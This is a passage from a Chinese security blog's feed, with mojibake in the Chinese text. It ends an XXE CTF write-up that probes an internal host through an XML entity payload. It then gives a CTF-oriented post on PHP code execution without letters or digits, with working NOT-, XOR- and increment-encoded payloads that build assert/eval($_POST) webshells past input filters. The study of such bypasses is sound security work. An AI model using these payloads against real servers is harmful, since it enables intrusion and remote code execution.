function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æµ‹è¯•è¯»å–<code>flag</code>ï¼Œç¡¬æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ— æ³•å‘½ä»¤æ‰§è¡Œï¼Œç½‘ä¸Šæ‰¾äº†æ‰¾<code>wp</code>ï¼Œæ”¾å¿ƒå±…ç„¶æ˜¯å†…ç½‘æ¢æµ‹ï¼Œè¯»å–<code>/etc/hosts</code>çš„æ–‡ä»¶ï¼Œè¯»åˆ°æœ¬æœº<code>ip</code>åœ°å€<code>173.56.110.9</code>ï¼Œäºæ˜¯æ¢æµ‹å­ç½‘ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "http://173.56.110.11" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><code>173.56.110.11</code>ï¼Œè¿”å›flag</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPathæ³¨å…¥å­¦ä¹ ä¹‹åŸºç¡€è¯­æ³•å­¦ä¹ </a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXEçŸ¥è¯†æ€»ç»“</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXEæ¼æ´å­¦ä¹ </a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-oRnOkvXS&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;5174564734&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="xml" scheme="https://www.extrader.top/tags/xml/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="xpath" scheme="https://www.extrader.top/tags/xpath/"/>
    
  </entry>
  
  <entry>
    <title>PHPæ— å­—æ¯æ•°å­—RCE</title>
    <link href="https://www.extrader.top/posts/a268445b/"/>
    <id>https://www.extrader.top/posts/a268445b/</id>
    <published>2020-08-09T04:22:50.000Z</published>
    <updated>2021-06-14T16:07:39.843Z</updated>
    
    <content type="html"><![CDATA[<p>CTFæœ‰æ—¶ä¼šç¢°åˆ°è¿™ç§ç±»å‹é¢˜ï¼Œæ•…åœ¨è¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼Œæ—¥åæœ‰æ–°çš„æ“ä½œå†è¡¥ä¸Š</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼š<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><span id="more"></span><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h3><p>phpç‰ˆæœ¬ï¼šPHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><p>phpç‰ˆæœ¬ï¼šPHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// è·‘å‡ºéå­—æ¯æ•°å­—å¼‚æˆ–å¾—åˆ°çš„ $str</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">;</span><span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token variable">$exp2</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token string single-quoted-string">'^'</span><span class="token operator">.</span><span class="token variable">$exp2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo<span class="token operator">==</span><span class="token operator">></span>  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span><span class="token constant">__</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>a<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span></code></pre><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><p>ç±»ä¼¼çš„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!((%)("</span><span class="token operator">^</span><span class="token string double-quoted-string">"@[[@[\\"</span><span class="token punctuation">;</span>   <span class="token comment">//æ„é€ å‡ºassert</span><span class="token variable">$__</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!+/(("</span><span class="token operator">^</span><span class="token string double-quoted-string">"~&#123;`&#123;|"</span><span class="token punctuation">;</span>   <span class="token comment">//æ„é€ å‡º_POST</span><span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$$__</span><span class="token punctuation">;</span>   <span class="token comment">//$___ = $_POST</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//assert($_POST[_]);</span></span></code></pre><h3 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>  <span class="token comment">//ä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºç©º</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ä»arrayarrayä¸­å–é¦–å­—ç¬¦ï¼Œå³aã€‚è¿™é‡Œ$_=$_[0]ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡wafé™åˆ¶æ•°å­—è¾“å…¥</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//b</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//c</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//d</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//e</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//E  æŠŠä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºE</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//F  ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//G </span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// GE  ä¸€ä¸ªçŸ­æ è‡ªå¢å˜æˆäº†Gï¼Œä¸¤ä¸ªçŸ­æ åœ¨å‰é¢ç¬¬åä¸€è¡Œå¤„å·²ç»èµ‹å€¼ä¸ºEï¼Œæ‹¼æ¥å¾—GE</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//H æ­¤å¤„ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢ï¼Œä¸ºH</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//I</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//J</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//k</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//L</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//M</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//N</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//O</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//P</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//Q</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//R</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//S</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//T</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// GET åœ¨æ­¤å¤„ï¼Œä¸¤æ¡çŸ­æ åŸæ˜¯GEä¸ä¸€æ¡çŸ­æ ï¼ˆå·²ç»è‡ªå¢ä¸ºTï¼‰ï¼Œ.=æ‹¼æ¥ï¼Œæ„æˆget</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¿›è¡Œæ‹¼æ¥ï¼Œ$_GET['_']($_GET['__']);</span>urlç¼–ç åï¼š<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">.</span><span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token 